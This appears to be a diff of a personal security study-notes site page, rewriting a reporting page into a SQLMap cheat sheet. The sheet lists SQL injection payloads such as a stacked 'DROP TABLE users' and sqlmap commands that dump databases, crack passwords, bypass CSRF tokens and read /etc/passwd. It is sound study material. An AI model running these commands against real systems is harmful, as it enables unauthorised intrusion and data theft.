@@ -9,28 +9,28 @@
       
       
       
-        <link rel="prev" href="../reconnaissance/">
+        <link rel="prev" href="../sql-injection-fundamentals/">
       
       
-        <link rel="next" href="../bscp-study-notes/">
+        <link rel="next" href="../web-attacks/">
       
       
         
       
       
-      <link rel="icon" href="../assets/images/favicon.png">
+      <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Reporting & POC - Dan's Cyber Stuff</title>
+        <title>SQLMap Essentials - Dan's Cyber Stuff</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -49,7 +49,7 @@
       
     
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#reporting-poc" class="md-skip">
+        <a href="#sqlmap-essentials-cheat-sheet" class="md-skip">
           Skip to content
         </a>
       
@@ -90,7 +90,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href=".." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -110,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Reporting & POC
+              SQLMap Essentials
             
           </span>
         </div>
@@ -214,7 +214,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -232,7 +232,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -308,7 +308,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../owasp-top-10-2025/" class="md-nav__link">
+      <a href="../../owasp-top-10-2025/" class="md-nav__link">
         
   
   
@@ -336,7 +336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../reconnaissance/" class="md-nav__link">
+      <a href="../../reconnaissance/" class="md-nav__link">
         
   
   
@@ -361,37 +361,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Reporting & POC
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../reporting-and-poc/" class="md-nav__link">
         
   
   
@@ -407,148 +380,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#report-sections" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Report Sections
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Report Sections">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cvss-31" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CVSS 3.1
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="CVSS 3.1">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#attack-vector" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack Vector
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#attack-complexity" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack Complexity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#privileges-required" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Privileges Required
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#user-interaction" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        User Interaction
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#scope" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Scope
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#confidentiality" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Confidentiality
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#integrity" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Integrity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#availability" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Availability
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -608,7 +439,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/" class="md-nav__link">
+      <a href="../../bscp-study-notes/" class="md-nav__link">
         
   
   
@@ -636,7 +467,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
+      <a href="../../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -664,7 +495,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
+      <a href="../../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -692,7 +523,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/command-injection/" class="md-nav__link">
+      <a href="../../bscp-study-notes/command-injection/" class="md-nav__link">
         
   
   
@@ -720,7 +551,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
+      <a href="../../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
         
   
   
@@ -748,7 +579,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/path-traversal/" class="md-nav__link">
+      <a href="../../bscp-study-notes/path-traversal/" class="md-nav__link">
         
   
   
@@ -776,7 +607,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/sql-injection/" class="md-nav__link">
+      <a href="../../bscp-study-notes/sql-injection/" class="md-nav__link">
         
   
   
@@ -859,7 +690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/" class="md-nav__link">
+      <a href="../../cwee-study-notes/" class="md-nav__link">
         
   
   
@@ -887,7 +718,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
+      <a href="../../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
         
   
   
@@ -915,7 +746,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/injection-attacks/" class="md-nav__link">
+      <a href="../../cwee-study-notes/injection-attacks/" class="md-nav__link">
         
   
   
@@ -943,7 +774,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
+      <a href="../../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
         
   
   
@@ -971,7 +802,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
+      <a href="../../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
         
   
   
@@ -1004,18 +835,20 @@
                 
   
   
+    
   
   
+  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" checked>
         
           
           <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
@@ -1036,7 +869,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_6">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1054,7 +887,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/api-attacks/" class="md-nav__link">
+      <a href="../api-attacks/" class="md-nav__link">
         
   
   
@@ -1082,7 +915,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/attacking-common-applications/" class="md-nav__link">
+      <a href="../attacking-common-applications/" class="md-nav__link">
         
   
   
@@ -1110,7 +943,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/attacking-graphql/" class="md-nav__link">
+      <a href="../attacking-graphql/" class="md-nav__link">
         
   
   
@@ -1138,7 +971,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
+      <a href="../attacking-web-applications-with-ffuf/" class="md-nav__link">
         
   
   
@@ -1166,7 +999,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/broken-authentication/" class="md-nav__link">
+      <a href="../broken-authentication/" class="md-nav__link">
         
   
   
@@ -1194,7 +1027,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/command-injections/" class="md-nav__link">
+      <a href="../command-injections/" class="md-nav__link">
         
   
   
@@ -1222,7 +1055,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
+      <a href="../cross-site-scripting-%28xss%29/" class="md-nav__link">
         
   
   
@@ -1250,7 +1083,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/file-inclusion/" class="md-nav__link">
+      <a href="../file-inclusion/" class="md-nav__link">
         
   
   
@@ -1278,7 +1111,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/file-upload-attacks/" class="md-nav__link">
+      <a href="../file-upload-attacks/" class="md-nav__link">
         
   
   
@@ -1306,7 +1139,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/hacking-wordpress/" class="md-nav__link">
+      <a href="../hacking-wordpress/" class="md-nav__link">
         
   
   
@@ -1334,7 +1167,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -1362,7 +1195,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/login-brute-forcing/" class="md-nav__link">
+      <a href="../login-brute-forcing/" class="md-nav__link">
         
   
   
@@ -1390,7 +1223,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/server-side-attacks/" class="md-nav__link">
+      <a href="../server-side-attacks/" class="md-nav__link">
         
   
   
@@ -1418,7 +1251,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/session-security/" class="md-nav__link">
+      <a href="../session-security/" class="md-nav__link">
         
   
   
@@ -1446,7 +1279,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
+      <a href="../sql-injection-fundamentals/" class="md-nav__link">
         
   
   
@@ -1471,10 +1304,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLMap Essentials
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1490,6 +1350,92 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#beustq" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BEUSTQ
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SQL Injection Types
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Commands
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tips
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-sqlmap-tamper-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common SQLMap Tamper Scripts
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1502,7 +1448,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/web-attacks/" class="md-nav__link">
+      <a href="../web-attacks/" class="md-nav__link">
         
   
   
@@ -1530,7 +1476,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/web-fuzzing/" class="md-nav__link">
+      <a href="../web-fuzzing/" class="md-nav__link">
         
   
   
@@ -1558,7 +1504,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
+      <a href="../web-service-and-api-attacks/" class="md-nav__link">
         
   
   
@@ -1641,7 +1587,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/" class="md-nav__link">
+      <a href="../../android-application-pentesting/" class="md-nav__link">
         
   
   
@@ -1669,7 +1615,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/android-fundamentals/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-fundamentals/" class="md-nav__link">
         
   
   
@@ -1697,7 +1643,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
         
   
   
@@ -1725,7 +1671,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
         
   
   
@@ -1808,7 +1754,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/curl/" class="md-nav__link">
+      <a href="../../tools-and-protocols/curl/" class="md-nav__link">
         
   
   
@@ -1836,7 +1782,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/ftp/" class="md-nav__link">
+      <a href="../../tools-and-protocols/ftp/" class="md-nav__link">
         
   
   
@@ -1864,7 +1810,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/gobuster/" class="md-nav__link">
+      <a href="../../tools-and-protocols/gobuster/" class="md-nav__link">
         
   
   
@@ -1892,7 +1838,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/nmap/" class="md-nav__link">
+      <a href="../../tools-and-protocols/nmap/" class="md-nav__link">
         
   
   
@@ -1955,124 +1901,68 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#report-sections" class="md-nav__link">
+  <a href="#beustq" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Report Sections
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Report Sections">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cvss-31" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CVSS 3.1
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="CVSS 3.1">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#attack-vector" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack Vector
+        BEUSTQ
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#attack-complexity" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-types" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Attack Complexity
+        SQL Injection Types
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#privileges-required" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#commands" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Privileges Required
+        Commands
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#user-interaction" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
     <span class="md-ellipsis">
       
-        User Interaction
+        Tips
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#scope" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#additional-flags" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Scope
+        Additional Flags
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#confidentiality" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#common-sqlmap-tamper-scripts" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Confidentiality
+        Common SQLMap Tamper Scripts
       
     </span>
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#integrity" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Integrity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#availability" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Availability
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -2093,121 +1983,414 @@
 
 
 
-<h1 id="reporting-poc">Reporting &amp; POC</h1>
-<h2 id="report-sections">Report Sections</h2>
+<h1 id="sqlmap-essentials-cheat-sheet">SQLMap Essentials Cheat Sheet</h1>
+<h2 id="beustq">BEUSTQ</h2>
+<p>BEUSTQ is SQLMap's default technique setting, representing SQLi types: </p>
+<ul>
+<li>B (Boolean-based blind)</li>
+<li>E (Error-based)</li>
+<li>U (Union query-based)</li>
+<li>S (Stacked queries)</li>
+<li>T (Time-based blind)</li>
+<li>Q (Inline queries).</li>
+</ul>
+<h2 id="sql-injection-types">SQL Injection Types</h2>
 <table>
 <thead>
 <tr>
-<th>Section</th>
+<th>Type</th>
+<th>Description</th>
+<th>Example</th>
+<th>Key Points</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Boolean-Based Blind</td>
+<td>Infers data via true/false responses.</td>
+<td><code>AND 1=1</code></td>
+<td>Useful with no output; slow, character-by-character.</td>
+</tr>
+<tr>
+<td>Error-Based</td>
+<td>Triggers errors to reveal data.</td>
+<td><code>AND GTID_SUBSET(@@version,0)</code></td>
+<td>Fast for chunks; requires visible errors.</td>
+</tr>
+<tr>
+<td>Union Query-Based</td>
+<td>Appends results with UNION.</td>
+<td><code>UNION ALL SELECT 1,@@version,3</code></td>
+<td>Fastest with direct output; needs column match.</td>
+</tr>
+<tr>
+<td>Stacked Queries</td>
+<td>Executes multiple statements.</td>
+<td><code>; DROP TABLE users</code></td>
+<td>For non-query statements; DBMS-specific.</td>
+</tr>
+<tr>
+<td>Time-Based Blind</td>
+<td>Delays response for inference.</td>
+<td><code>AND 1=IF(2&gt;1,SLEEP(5),0)</code></td>
+<td>Useful with no response change; slower due to delays.</td>
+</tr>
+<tr>
+<td>Inline Queries</td>
+<td>Embeds query within original.</td>
+<td><code>SELECT (SELECT @@version) from</code></td>
+<td>Uncommon; for specific app structures.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="commands">Commands</h2>
+<p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLMap wiki</a></p>
+<p><strong>Note:</strong> SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers, specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*").</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Title</td>
-<td>Concise vulnerability name including type, target, and impact</td>
+<td><code>sqlmap -h</code></td>
+<td>View the basic help menu</td>
 </tr>
 <tr>
-<td>Severity</td>
-<td>Overall severity rating (Low/Medium/High)</td>
+<td><code>sqlmap -hh</code></td>
+<td>View the advanced help menu</td>
 </tr>
 <tr>
-<td>Impact</td>
-<td>Impact rating (Low/Medium/High)</td>
+<td><code>sqlmap -u "http://www.example.com/vuln.php?id=1" --batch</code></td>
+<td>Run SQLMap without asking for user input, id will be tested</td>
 </tr>
 <tr>
-<td>Exploitability</td>
-<td>Exploitability rating (Low/Medium/High)</td>
+<td><code>sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'</code></td>
+<td>Run SQLMap with request headers, use copy as curl in developer tools and replace <code>curl</code> with <code>sqlmap</code></td>
 </tr>
 <tr>
-<td>CVSS Base Score</td>
-<td>Numerical CVSS base score</td>
+<td><code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code></td>
+<td>SQLMap with POST request, uid and name will be tested</td>
 </tr>
 <tr>
-<td>CVSS v3 Vector</td>
-<td>Full CVSS v3.1 vector string</td>
+<td><code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code></td>
+<td>POST request specifying an injection point with an asterisk, can be used within saved request file also</td>
 </tr>
 <tr>
-<td>Vulnerability Type</td>
-<td>Type of vulnerability (e.g. XSS, IDOR)</td>
+<td><code>sqlmap -r req.txt</code></td>
+<td>Passing an HTTP request file to SQLMap, right-click the request within Burp and choose Copy to file or Copy &gt; Copy Request Headers in browser (can use JSON formatted and XML formatted HTTP requests, copy raw request from network tab in dev tools)</td>
 </tr>
 <tr>
-<td>Target</td>
-<td>Affected endpoint, parameter, domain, or asset</td>
+<td><code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td>
+<td>Specifying a cookie header</td>
 </tr>
 <tr>
-<td>Impact</td>
-<td>Detailed business and technical impact of exploitation</td>
+<td><code>sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td>
+<td>Specifying a cookie header</td>
 </tr>
 <tr>
-<td>Description</td>
-<td>Clear explanation of the vulnerability cause and mechanics</td>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --random-agent</code></td>
+<td>Randomly select a User-agent header value or use <code>--mobile</code> switch to imitate the smartphone</td>
 </tr>
 <tr>
-<td>Steps to Reproduce</td>
-<td>Concise, step-by-step reproduction instructions</td>
+<td><code>sqlmap -u www.target.com --data='id=1' --method PUT</code></td>
+<td>Specifying a PUT request</td>
 </tr>
 <tr>
-<td>Recommendation</td>
-<td>Specific remediation or mitigation steps</td>
+<td><code>sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt</code></td>
+<td>Store traffic to an output file</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch</code></td>
+<td>Specify verbosity level</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</code></td>
+<td>Specifying a prefix or suffix</td>
+</tr>
+<tr>
+<td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3</code></td>
+<td>Specifying the level (boundaries used) and risk (vectors used)</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs</code></td>
+<td>Dump all databases excluding system databases</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</code></td>
+<td>Basic DB enumeration (version, current user/database name, if the current user has admin rights)</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</code></td>
+<td>Table enumeration, specifying database name</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -D testdb</code></td>
+<td>Dump all tables</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb</code></td>
+<td>Dump whole table, specifying table and database name</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</code></td>
+<td>Only dump specified columns</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3</code></td>
+<td>Only dump specified rows</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></td>
+<td>Conditional enumeration</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --schema</code></td>
+<td>Database schema enumeration</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td>
+<td>Searching for all tables containing user</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --search -C pass</code></td>
+<td>Searching for all columns containing pass</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td>
+<td>Searching for all tables containing user</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</code></td>
+<td>Password enumeration and cracking</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></td>
+<td>Anti-CSRF token bypass</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1&amp;rp=29125" --randomize=rp</code></td>
+<td>Unique value bypass</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"</code></td>
+<td>Calculated parameter bypass</td>
+</tr>
+<tr>
+<td><code>sqlmap --list-tampers</code></td>
+<td>List all tamper scripts</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba</code></td>
+<td>Check for DBA privileges</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</code></td>
+<td>Reading a local file</td>
+</tr>
+<tr>
